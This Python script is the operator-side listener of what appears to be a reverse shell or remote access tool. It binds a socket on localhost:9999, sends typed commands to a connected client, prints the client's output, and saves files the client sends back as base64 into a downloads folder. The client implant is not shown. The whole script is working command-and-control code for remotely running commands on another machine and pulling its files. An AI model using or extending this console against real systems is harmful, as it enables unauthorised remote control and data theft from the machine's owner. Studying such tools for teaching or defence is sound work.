from genericpath import isdir
import socket
import os
import base64

#CreateDownloadsDirectory
if(not os.path.isdir('downloads')):
    os.mkdir('downloads')
downloads_path = os.path.join(os.getcwd(), 'downloads')

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("localhost", 9999))
server.listen(5)
client, addresss = server.accept()
while True:
    # command
    command = input("> ")
    client.send(command.encode())
    # Data
    data = client.recv(1024)
    if(not data): break
    # Commands
    if(command.startswith("file")):
        with open(os.path.join(downloads_path, command.split(' ')[1]), 'wb') as file:
            data = base64.b64decode(data)
            file.write(data)
            file.close()
        print("File saved")
    elif(command.startswith("exit")):
        client.close()
        server.close()
        break
    else:
        print("Client recv:\n"+str(data.decode()))